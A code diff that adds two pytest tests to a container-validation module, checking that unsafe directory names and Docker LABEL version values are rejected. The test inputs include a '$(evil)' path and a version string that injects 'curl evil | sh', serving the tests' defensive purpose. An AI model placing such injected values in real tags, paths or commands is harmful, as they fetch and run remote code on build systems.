@@ -45,6 +45,11 @@ def test_detect_rejects_top_level_file(tmp_path):
     assert errors and "not inside a container directory" in errors[0]
 
 
+def test_detect_rejects_unsafe_directory_names(tmp_path):
+    _, _, errors = validate.detect_container(["abyss/$(evil)/Dockerfile"], str(tmp_path))
+    assert errors and "[A-Za-z0-9._-]" in errors[0]
+
+
 # ---------------------------------------------------------------- list
 
 def test_list_multiple_containers(tmp_path):
@@ -150,6 +155,17 @@ def test_check_short_summary_fails(tmp_path, monkeypatch):
     ok, _, _, errors, _ = validate.check_labels("abyss", "2.1.5-7-deb", labels, str(df))
     assert ok is False
     assert any("about.summary" in e for e in errors)
+
+
+def test_check_rejects_shell_metacharacters_in_tag(tmp_path, monkeypatch):
+    _no_network(monkeypatch)
+    df = tmp_path / "Dockerfile"
+    df.write_text("FROM x\n")
+    labels = _good_labels()
+    labels["version"] = '1"; curl evil | sh; "'   # malicious LABEL version
+    ok, _, tag, errors, _ = validate.check_labels("abyss", "2.1.5-7-deb", labels, str(df))
+    assert ok is False
+    assert any("not a valid Docker tag" in e for e in errors)
 
 
 def test_check_tag_defaults_cv1_when_version_blank(tmp_path, monkeypatch):
